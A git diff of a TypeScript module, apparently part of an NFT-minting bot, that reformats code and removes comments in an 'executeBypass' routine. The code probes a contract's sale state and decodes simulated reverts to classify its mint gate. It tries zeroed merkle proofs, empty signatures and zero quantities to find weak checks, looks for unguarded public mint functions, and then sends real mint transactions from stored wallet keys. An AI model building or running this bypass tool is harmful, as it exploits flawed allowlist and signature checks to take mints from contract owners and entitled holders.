@@ -56,9 +56,7 @@ export interface BypassPlan {
 }
 
 export interface BypassOptions {
-  // Simulate only — never send a real transaction.
   dryRun?: boolean;
-  // Map contract state + mint signatures only — never send a transaction.
   probeOnly?: boolean;
 }
 
@@ -73,8 +71,6 @@ export interface ProbeRowCall {
   data: Hex;
 }
 
-// Common reverts that carry human-readable data. Custom errors on the target
-// contract are decoded separately when its ABI is available.
 const REVERT_ABI = parseAbi([
   "error Error(string)",
   "error Panic(uint256)",
@@ -83,12 +79,10 @@ const REVERT_ABI = parseAbi([
 const MAX_WALLET_ATTEMPTS = 5;
 const RECEIPT_TIMEOUT_MS = 60_000;
 
-// View-function names worth reading to learn a contract's gate state.
 const PROBE_NAME_RE =
   /^(public|whitelist|allowlist|presale|sale|mint|free|phase|start|end|open|active|live|paused|supply|max|price|total)/i;
 const MAX_PROBE_READS = 24;
 
-// Timestamp-like public-window state keys (unix seconds).
 const PUBLIC_START_KEYS = [
   "publicSaleStartTime",
   "saleStartTime",
@@ -105,10 +99,6 @@ const PUBLIC_START_KEYS = [
 // Gate classification
 // ---------------------------------------------------------------------------
 
-// Fallback: infer the gate from mint function names/signatures. This alone
-// misclassifies (e.g. whitelist-gated `mint()` looks like mint_open), so it is
-// only a starting point — executeBypass overrides it from state probing and
-// simulation revert decoding.
 export function detectGateType(mintFunctions: MintFunctionInfo[]): GateType {
   if (!mintFunctions || mintFunctions.length === 0) return "none";
 
@@ -161,18 +151,23 @@ export function getBypassPlan(result: ScanResult): BypassPlan {
   };
 }
 
-// The authoritative classifier: read the actual revert the chain returned for
-// a simulated mint call. A whitelist-gated `mint()` reverts with something
-// like "Not whitelisted" no matter what its name suggests.
 export function classifyRevertReason(reason: string): GateType | undefined {
   const r = reason.toLowerCase();
-  if (/whitelist|allowlist|not whitelisted|not on (the )?list|no access|not in list|merkle|proof/.test(r)) {
+  if (
+    /whitelist|allowlist|not whitelisted|not on (the )?list|no access|not in list|merkle|proof/.test(
+      r
+    )
+  ) {
     return "whitelist";
   }
   if (/signature|invalid sig|bad sig|sig.*expired|voucher|eip-?712/.test(r)) {
     return "signature";
   }
-  if (/paused|not live|sale.*not.*(start|open)|closed|ended|sold out|max supply|mint limit|exceed(s|ed)|too (early|soon)/.test(r)) {
+  if (
+    /paused|not live|sale.*not.*(start|open)|closed|ended|sold out|max supply|mint limit|exceed(s|ed)|too (early|soon)/.test(
+      r
+    )
+  ) {
     return /paused/.test(r) ? "paused" : "timed";
   }
   if (/\b(price|payment|payable|value|eth|ether|funds?)\b/.test(r)) {
@@ -184,6 +179,7 @@ export function classifyRevertReason(reason: string): GateType | undefined {
 // ---------------------------------------------------------------------------
 // State probing
 // ---------------------------------------------------------------------------
+
 function normalizeProbeValue(value: unknown): ProbeRow["value"] {
   if (value === null || value === undefined) return null;
   if (typeof value === "boolean") return value;
@@ -228,14 +224,12 @@ export async function probeStateVariables(
       } as any);
       rows.push({ name: fn.name, value: normalizeProbeValue(value) });
     } catch {
-      // individual reads may fail (RPC hiccup / unsupported output type) —
       // keep probing the rest
     }
   }
   return rows;
 }
 
-// Combine ABI-level gate detection with what the chain actually reports.
 export function refineGate(probe: ProbeRow[], fallback: GateType): GateType {
   if (!probe || probe.length === 0) return fallback;
   const first = (re: RegExp) => probe.find((r) => re.test(r.name));
@@ -260,6 +254,11 @@ export function refineGate(probe: ProbeRow[], fallback: GateType): GateType {
     return "mint_open";
   }
 
+  const closed = first(
+    /^(whitelistOnly|isWhitelistOnly|presaleOnly|allowlistOnly)$/i
+  );
+  if (closed && closed.value === true) return "whitelist";
+
   const presaleEnd = first(
     /^(presaleEnd|whitelistEnd|allowlistEnd|presaleEndTime|whitelistEndTime|allowlistEndTime|privateEndTime|ogEnd|earlyAccessEnd)$/i
   );
@@ -275,14 +274,12 @@ export function refineGate(probe: ProbeRow[], fallback: GateType): GateType {
   return fallback;
 }
 
-// Earliest future public-window timestamp found in state (unix seconds → ms).
-export function detectPublicMintAt(probe: ProbeRow[]): {
-  atMs: number;
-  label: string;
-} | null {
+export function detectPublicMintAt(
+  probe: ProbeRow[]
+): { atMs: number; label: string } | null {
   if (!probe || probe.length === 0) return null;
   const nowMs = Date.now();
-  let atSec: number | null = null;
+  let bestMs: number | null = null;
   let keyName = "";
 
   for (const key of PUBLIC_START_KEYS) {
@@ -290,16 +287,16 @@ export function detectPublicMintAt(probe: ProbeRow[]): {
     if (!row || typeof row.value !== "number" || row.value <= 0) continue;
     const atMs = row.value * 1000;
     if (atMs <= nowMs) continue;
-    if (atSec === null || atMs < atSec) {
-      atSec = atMs;
+    if (bestMs === null || atMs < bestMs) {
+      bestMs = atMs;
       keyName = row.name;
     }
   }
 
-  if (atSec === null) return null;
+  if (bestMs === null) return null;
   return {
-    atMs: atSec,
-    label: `${keyName} → ${new Date(atSec).toUTCString()} (in ~${formatDuration(atSec - nowMs)})`,
+    atMs: bestMs,
+    label: `${keyName} → ${new Date(bestMs).toUTCString()} (in ~${formatDuration(bestMs - nowMs)})`,
   };
 }
 
@@ -315,11 +312,9 @@ function formatDuration(ms: number): string {
 }
 
 // ---------------------------------------------------------------------------
-// Calldata + simulation helpers
+// Calldata + simulation
 // ---------------------------------------------------------------------------
 
-// Rebuild args per wallet so `address` params reference the actual signer, and
-// fill scalar params with the smallest values that satisfy a mint (qty 1).
 function buildArgs(fn: MintFunctionInfo, fromAddress: string): unknown[] {
   const args: string[] = fn.args ?? [];
   return args.map((arg) => {
@@ -345,14 +340,14 @@ function encodeCall(fn: MintFunctionInfo, args: unknown[]): Hex {
   const stateMutability =
     (fn as { stateMutability?: string }).stateMutability ?? "nonpayable";
   const fnAbi = {
-    type: "function",
+    type: "function" as const,
     name: fn.name,
     stateMutability,
     inputs: (fn.args ?? []).map((arg, i) => ({
       name: `arg${i}`,
       type: arg.trim(),
     })),
-    outputs: [],
+    outputs: [] as { name: string; type: string }[],
   };
   return encodeFunctionData({
     abi: [fnAbi] as unknown as Abi,
@@ -361,8 +356,17 @@ function encodeCall(fn: MintFunctionInfo, args: unknown[]): Hex {
   });
 }
 
-// Decode a revert into a human-readable reason: prefer Error(string) /
-// Panic(uint256), then the contract's own custom errors, then raw hex.
+function asDecodedError(decoded: unknown): {
+  errorName: string;
+  args: readonly unknown[];
+} {
+  const d = decoded as { errorName?: unknown; args?: unknown };
+  const errorName =
+    typeof d.errorName === "string" ? d.errorName : "UnknownError";
+  const args = Array.isArray(d.args) ? (d.args as readonly unknown[]) : [];
+  return { errorName, args };
+}
+
 export function decodeRevertReason(raw: unknown, abi?: Abi | null): string {
   let data: string | null = null;
   let message = "";
@@ -390,7 +394,12 @@ export function decodeRevertReason(raw: unknown, abi?: Abi | null): string {
           ? err.message
           : "";
     const cause = err.cause as { data?: unknown; message?: unknown } | undefined;
-    if (!data && cause && typeof cause.data === "string" && cause.data.startsWith("0x")) {
+    if (
+      !data &&
+      cause &&
+      typeof cause.data === "string" &&
+      cause.data.startsWith("0x")
+    ) {
       data = cause.data;
     }
     if (!message && cause && typeof cause.message === "string") {
@@ -400,33 +409,40 @@ export function decodeRevertReason(raw: unknown, abi?: Abi | null): string {
 
   if (data) {
     try {
-      const decoded = decodeErrorResult({
-        abi: REVERT_ABI as any,
-        data: data as Hex,
-      }) as { errorName: string; args?: unknown[] };
+      const decoded = asDecodedError(
+        decodeErrorResult({
+          abi: REVERT_ABI as any,
+          data: data as Hex,
+        })
+      );
       if (
         decoded.errorName === "Error" &&
-        Array.isArray(decoded.args) &&
         typeof decoded.args[0] === "string"
       ) {
         return decoded.args[0];
       }
-      return `${decoded.errorName}(${JSON.stringify(decoded.args ?? [])})`;
+      if (decoded.errorName === "Panic") {
+        return `Panic(${String(decoded.args[0] ?? "")})`;
+      }
+      return `${decoded.errorName}(${JSON.stringify(decoded.args)})`;
     } catch {
-      // not Error(string)/Panic — try the contract ABI next
+      // not Error(string)/Panic
     }
     if (abi) {
       try {
-        const decoded = decodeErrorResult({
-          abi: abi as any,
-          data: data as Hex,
-        }) as { errorName: string; args?: unknown[] };
-        const args = decoded.args ?? [];
-        return args.length > 0
-          ? `${decoded.errorName}(${args.map((a) => JSON.stringify(a)).join(", ")})`
+        const decoded = asDecodedError(
+          decodeErrorResult({
+            abi: abi as any,
+            data: data as Hex,
+          })
+        );
+        return decoded.args.length > 0
+          ? `${decoded.errorName}(${decoded.args
+              .map((a) => JSON.stringify(a))
+              .join(", ")})`
           : decoded.errorName;
       } catch {
-        // unknown selector — fall through
+        // unknown selector
       }
     }
     return `revert 0x${data.slice(2, 10)}…`;
@@ -445,7 +461,6 @@ interface SimResult {
   error?: string;
 }
 
-// eth_call simulation with value 0 — never risks funds, always reveals the gate.
 async function simulateCall(
   client: ReturnType<typeof getPublicClient>,
   address: Address,
@@ -461,12 +476,13 @@ async function simulateCall(
   }
 }
 
+// Prisma BypassLog fields: walletAddress + success (NOT fromAddress/ok)
 async function logBypass(
   userId: bigint,
   contractAddress: string,
   strategyId: string,
-  fromAddress: string,
-  ok: boolean,
+  walletAddress: string,
+  success: boolean,
   txHash?: string,
   error?: string
 ): Promise<void> {
@@ -476,9 +492,9 @@ async function logBypass(
         userId,
         contractAddress,
         strategyId,
-        fromAddress,
-        ok,
-        txHash,
+        walletAddress,
+        success,
+        txHash: txHash ?? null,
         error: error ?? null,
       },
     });
@@ -491,7 +507,6 @@ async function logBypass(
 // Strategy ladder
 // ---------------------------------------------------------------------------
 
-// Direct free-mint path when the name scan says the gate is open.
 async function tryDirectMint(
   userId: bigint,
   address: string,
@@ -512,25 +527,47 @@ async function tryDirectMint(
     const privateKey = await getWalletPrivateKey(wallet.id).catch(() => null);
     if (!privateKey) continue;
 
-    const hexKey = (privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`) as Hex;
+    const hexKey = (
+      privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`
+    ) as Hex;
     const fromAddress = getAddressFromPrivateKey(hexKey);
 
     let data: Hex;
     try {
       data = encodeCall(targetFn, buildArgs(targetFn, fromAddress));
     } catch {
-      continue; // unencodable signature — next wallet
+      continue;
     }
 
-    const sim = await simulateCall(client, address as Address, data, fromAddress, result.abi ?? undefined);
+    const sim = await simulateCall(
+      client,
+      address as Address,
+      data,
+      fromAddress,
+      result.abi ?? undefined
+    );
     if (!sim.ok) {
       lastSimError = sim.error;
       continue;
     }
 
     if (options.dryRun) {
-      await logBypass(userId, address, strategyId, fromAddress, true, undefined, "dry-run (simulation only)");
-      return { ...base, success: true, strategyId, walletAddress: fromAddress, dryRun: true };
+      await logBypass(
+        userId,
+        address,
+        strategyId,
+        fromAddress,
+        true,
+        undefined,
+        "dry-run (simulation only)"
+      );
+      return {
+        ...base,
+        success: true,
+        strategyId,
+        walletAddress: fromAddress,
+        dryRun: true,
+      };
     }
 
     try {
@@ -540,18 +577,28 @@ async function tryDirectMint(
         data,
         value: 0n,
       });
-      // Bound the receipt wait so a stalled node can't hang the command forever.
       const receiptTimeout = new Promise<never>((_, reject) =>
-        setTimeout(() => reject(new Error("Transaction receipt timeout")), RECEIPT_TIMEOUT_MS)
+        setTimeout(
+          () => reject(new Error("Transaction receipt timeout")),
+          RECEIPT_TIMEOUT_MS
+        )
       );
-      receiptTimeout.catch(() => undefined); // avoid unhandled rejection later
-      await Promise.race([client.waitForTransactionReceipt({ hash: txHash }), receiptTimeout]);
+      receiptTimeout.catch(() => undefined);
+      await Promise.race([
+        client.waitForTransactionReceipt({ hash: txHash }),
+        receiptTimeout,
+      ]);
 
       await logBypass(userId, address, strategyId, fromAddress, true, txHash);
-      return { ...base, success: true, strategyId, walletAddress: fromAddress, txHash };
+      return {
+        ...base,
+        success: true,
+        strategyId,
+        walletAddress: fromAddress,
+        txHash,
+      };
     } catch (err) {
       lastSendError = err instanceof Error ? err.message : String(err);
-      // try the next wallet
     }
   }
 
@@ -561,9 +608,10 @@ async function tryDirectMint(
   return null;
 }
 
-// Exhaustive argument matrix over a mint surface — zero proof, zero qty, zero
-// value. This is what catches sloppy signature/merkle checks.
-function buildProbeMatrix(fns: MintFunctionInfo[], fromAddress: string): ProbeRowCall[] {
+function buildProbeMatrix(
+  fns: MintFunctionInfo[],
+  fromAddress: string
+): ProbeRowCall[] {
   const rows: ProbeRowCall[] = [];
   for (const fn of fns) {
     let baseArgs: unknown[];
@@ -571,16 +619,17 @@ function buildProbeMatrix(fns: MintFunctionInfo[], fromAddress: string): ProbeRo
       baseArgs = buildArgs(fn, fromAddress);
       rows.push({ fn, args: baseArgs, data: encodeCall(fn, baseArgs) });
     } catch {
-      continue; // unencodable signature
+      continue;
     }
 
-    // Variant: empty/zero bytes (tests sloppy signature or merkle checks).
-    const sigIdx = fn.args.findIndex((a) => /^bytes/.test(a.trim().toLowerCase()));
+    const sigIdx = fn.args.findIndex((a) =>
+      /^bytes/.test(a.trim().toLowerCase())
+    );
     if (sigIdx >= 0) {
       const variant = baseArgs.slice();
       const t = fn.args[sigIdx].trim().toLowerCase();
       if (t.includes("[")) {
-        variant[sigIdx] = [("0x" + "00".repeat(32)) as Hex]; // one zero proof leaf
+        variant[sigIdx] = [("0x" + "00".repeat(32)) as Hex];
       } else if (t.startsWith("bytes32")) {
         variant[sigIdx] = ("0x" + "00".repeat(32)) as Hex;
       } else {
@@ -589,19 +638,20 @@ function buildProbeMatrix(fns: MintFunctionInfo[], fromAddress: string): ProbeRo
       try {
         rows.push({ fn, args: variant, data: encodeCall(fn, variant) });
       } catch {
-        // skip unencodable variant
+        // skip
       }
     }
 
-    // Variant: zero quantity.
-    const uintIdx = fn.args.findIndex((a) => /^uint/.test(a.trim().toLowerCase()));
+    const uintIdx = fn.args.findIndex((a) =>
+      /^uint/.test(a.trim().toLowerCase())
+    );
     if (uintIdx >= 0) {
       const variant = baseArgs.slice();
       variant[uintIdx] = 0n;
       try {
         rows.push({ fn, args: variant, data: encodeCall(fn, variant) });
       } catch {
-        // skip unencodable variant
+        // skip
       }
     }
   }
@@ -616,14 +666,18 @@ async function findWorkingCall(
   abi: Abi
 ): Promise<ProbeRowCall | null> {
   for (const row of rows) {
-    const sim = await simulateCall(client, address, row.data, fromAddress, abi);
+    const sim = await simulateCall(
+      client,
+      address,
+      row.data,
+      fromAddress,
+      abi
+    );
     if (sim.ok) return row;
   }
   return null;
 }
 
-// Generic matrix path: exhaustively simulate a bounded set of mint-call
-// variants (value 0 — never risks funds) and fire the first accepted one.
 async function tryMatrix(
   userId: bigint,
   address: string,
@@ -641,19 +695,40 @@ async function tryMatrix(
     const privateKey = await getWalletPrivateKey(wallet.id).catch(() => null);
     if (!privateKey) continue;
 
-    const hexKey = (privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`) as Hex;
+    const hexKey = (
+      privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`
+    ) as Hex;
     const fromAddress = getAddressFromPrivateKey(hexKey);
 
     const rows = buildProbeMatrix(fns, fromAddress);
-    const hit = await findWorkingCall(client, address as Address, rows, fromAddress, result.abi);
+    const hit = await findWorkingCall(
+      client,
+      address as Address,
+      rows,
+      fromAddress,
+      result.abi
+    );
     if (!hit) continue;
 
     base.strategyId = strategyId;
     base.gateType = "mint_open";
 
     if (options.dryRun) {
-      await logBypass(userId, address, strategyId, fromAddress, true, undefined, "dry-run (simulation only)");
-      return { ...base, success: true, walletAddress: fromAddress, dryRun: true };
+      await logBypass(
+        userId,
+        address,
+        strategyId,
+        fromAddress,
+        true,
+        undefined,
+        "dry-run (simulation only)"
+      );
+      return {
+        ...base,
+        success: true,
+        walletAddress: fromAddress,
+        dryRun: true,
+      };
     }
 
     try {
@@ -664,27 +739,35 @@ async function tryMatrix(
         value: 0n,
       });
       const receiptTimeout = new Promise<never>((_, reject) =>
-        setTimeout(() => reject(new Error("Transaction receipt timeout")), RECEIPT_TIMEOUT_MS)
+        setTimeout(
+          () => reject(new Error("Transaction receipt timeout")),
+          RECEIPT_TIMEOUT_MS
+        )
       );
       receiptTimeout.catch(() => undefined);
-      await Promise.race([client.waitForTransactionReceipt({ hash: txHash }), receiptTimeout]);
+      await Promise.race([
+        client.waitForTransactionReceipt({ hash: txHash }),
+        receiptTimeout,
+      ]);
 
       await logBypass(userId, address, strategyId, fromAddress, true, txHash);
-      return { ...base, success: true, walletAddress: fromAddress, txHash };
+      return {
+        ...base,
+        success: true,
+        walletAddress: fromAddress,
+        txHash,
+      };
     } catch (err) {
       base.error = err instanceof Error ? err.message : String(err);
-      // try the next wallet
     }
   }
 
-  if (!base.error) base.error = "No mint call simulated successfully (gate not bypassable)";
+  if (!base.error) {
+    base.error = "No mint call simulated successfully (gate not bypassable)";
+  }
   return null;
 }
 
-// Public-path attempt for whitelist/timed gates: look for mint functions that
-// are NOT whitelist/presale/signature flavored (mislabeled free helpers,
-// publicMint, claim, collect...). This is how genuinely "whitelist-gated"
-// contracts get through when the check only guards the main mint().
 function publicPathFunctions(result: ScanResult): MintFunctionInfo[] {
   if (!result.abi) return [];
   return analyzeAbiForMintFunctions(result.abi).filter((f) => {
@@ -693,7 +776,9 @@ function publicPathFunctions(result: ScanResult): MintFunctionInfo[] {
       /^(public|free|claim|collect|mint|airdrop|open)/.test(n) ||
       /public|free|claim|collect|open/.test(n);
     const isGated =
-      /whitelist|allowlist|presale|og|early|sig|voucher|merkle|proof|team|owner|admin|dev/.test(n);
+      /whitelist|allowlist|presale|og|early|sig|voucher|merkle|proof|team|owner|admin|dev/.test(
+        n
+      );
     return isPublicFlavored && !isGated;
   });
 }
@@ -735,6 +820,7 @@ function buildFinalError(
 // ---------------------------------------------------------------------------
 // Orchestrator
 // ---------------------------------------------------------------------------
+
 export async function executeBypass(
   userId: bigint,
   rawAddress: string,
@@ -746,8 +832,11 @@ export async function executeBypass(
   const result: ScanResult = await scanContract(address);
   const client = getPublicClient();
 
-  // 1) Learn the contract's live state from its view functions.
-  const probe = await probeStateVariables(client, result.abi, address as Address);
+  const probe = await probeStateVariables(
+    client,
+    result.abi,
+    address as Address
+  );
   const plan = getBypassPlan(result);
   const state = refineGate(probe, plan.gateType);
   const publicMintAt = detectPublicMintAt(probe);
@@ -762,12 +851,19 @@ export async function executeBypass(
     publicMintAt,
   };
 
-  // 2) --probe: report state + gate picture only, never touch the chain.
   if (options.probeOnly) {
     base.success = true;
     base.strategyId = "probe_matrix";
     base.probeOnly = true;
-    await logBypass(userId, address, "probe_matrix", "", true, undefined, "probe-only (no tx)");
+    await logBypass(
+      userId,
+      address,
+      "probe_matrix",
+      "",
+      true,
+      undefined,
+      "probe-only (no tx)"
+    );
     return base;
   }
 
@@ -785,16 +881,11 @@ export async function executeBypass(
     return { ...base, error };
   }
 
-  // Active wallets first, then inactive; stop after a few attempts so a fully
-  // gated contract can't burn minutes on simulated calls.
   const attempts = [
     ...wallets.filter((w) => w.isActive),
     ...wallets.filter((w) => !w.isActive),
   ].slice(0, MAX_WALLET_ATTEMPTS);
 
-  // 3) Simulation-first gate classification: simulate the best free mint fn
-  //    and decode the revert. This is what catches `mint()` that is really
-  //    whitelist-gated ("Not whitelisted") despite its innocent name.
   const bestFn =
     plan.targetFn ??
     getBestMintFunction(result.mintFunctions) ??
@@ -805,7 +896,9 @@ export async function executeBypass(
     for (const wallet of attempts) {
       const privateKey = await getWalletPrivateKey(wallet.id).catch(() => null);
       if (!privateKey) continue;
-      const hexKey = (privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`) as Hex;
+      const hexKey = (
+        privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`
+      ) as Hex;
       const fromAddress = getAddressFromPrivateKey(hexKey);
       let data: Hex;
       try {
@@ -813,7 +906,13 @@ export async function executeBypass(
       } catch {
         continue;
       }
-      const sim = await simulateCall(client, address as Address, data, fromAddress, result.abi ?? undefined);
+      const sim = await simulateCall(
+        client,
+        address as Address,
+        data,
+        fromAddress,
+        result.abi ?? undefined
+      );
       if (sim.ok) {
         simError = undefined;
         break;
@@ -824,18 +923,24 @@ export async function executeBypass(
   const classified = simError ? classifyRevertReason(simError) : undefined;
   if (classified) base.gateType = classified;
 
-  // 4) Strategy ladder.
-  //    a) Direct free-mint path when the name scan says the gate is open.
   if (
     plan.executable &&
     plan.targetFn &&
     (!classified || classified === "mint_open")
   ) {
-    const direct = await tryDirectMint(userId, address, result, plan, client, attempts, options, base);
+    const direct = await tryDirectMint(
+      userId,
+      address,
+      result,
+      plan,
+      client,
+      attempts,
+      options,
+      base
+    );
     if (direct) return direct;
   }
 
-  //    b) Whitelist / timed / paused: hunt for a mislabeled public path.
   if (
     base.gateType === "whitelist" ||
     base.gateType === "timed" ||
@@ -843,23 +948,45 @@ export async function executeBypass(
   ) {
     const pubFns = publicPathFunctions(result);
     if (pubFns.length > 0) {
-      const pub = await tryMatrix(userId, address, result, client, attempts, options, base, pubFns, "public_path");
+      const pub = await tryMatrix(
+        userId,
+        address,
+        result,
+        client,
+        attempts,
+        options,
+        base,
+        pubFns,
+        "public_path"
+      );
       if (pub) return pub;
     }
   }
 
-  //    c) Generic matrix over the full mint surface (free fns first). Skipped
-  //       for payment gates — every call will revert on price and burn time.
   if (base.gateType !== "payment" && base.gateType !== "paused") {
     const allFns = result.abi ? analyzeAbiForMintFunctions(result.abi) : [];
     if (allFns.length > 0) {
-      const matrix = await tryMatrix(userId, address, result, client, attempts, options, base, allFns, "probe_matrix");
+      const matrix = await tryMatrix(
+        userId,
+        address,
+        result,
+        client,
+        attempts,
+        options,
+        base,
+        allFns,
+        "probe_matrix"
+      );
       if (matrix) return matrix;
     }
   }
 
-  // 5) Honest failure with gate-specific guidance.
-  const error = buildFinalError(base.gateType, simError, publicMintAt, plan.reason);
+  const error = buildFinalError(
+    base.gateType,
+    simError,
+    publicMintAt,
+    plan.reason
+  );
   await logBypass(userId, address, base.strategyId, "", false, undefined, error);
   return { ...base, error };
 }
